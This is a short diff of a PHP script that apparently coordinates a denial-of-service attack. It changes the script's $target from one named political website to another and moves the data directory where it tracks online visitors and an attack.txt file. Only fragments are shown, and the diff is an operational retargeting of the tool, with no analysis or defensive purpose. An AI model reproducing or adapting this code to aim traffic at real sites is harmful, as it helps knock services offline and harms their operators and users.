@@ -1,7 +1,7 @@
 <?php
 error_reporting(0);
 
-$target = "gayrussia.eu";
+$target = "putinvzrivaetdoma.org";
 
 $ip = $_SERVER['REMOTE_ADDR'];
 $time = time();
@@ -15,7 +15,7 @@ $user  = "";
 $a = $_GET["a"];
 $callback = $_GET["callback"];
 
-$tmpdata = "/home/vadik/www/lenta/online/data2";
+$tmpdata = "../chat/logs";
 
 if (!is_file("$tmpdata/online.txt"))	
 	{
@@ -57,7 +57,6 @@ fclose ($f);
 
 /* * */
 
-$tmpdata = "/home/vadik/www/lenta/online/data2";
 if (!is_file("$tmpdata/attack.txt")){
 	$s = fopen("$tmpdata/attack.txt","w");
 	fclose($s);
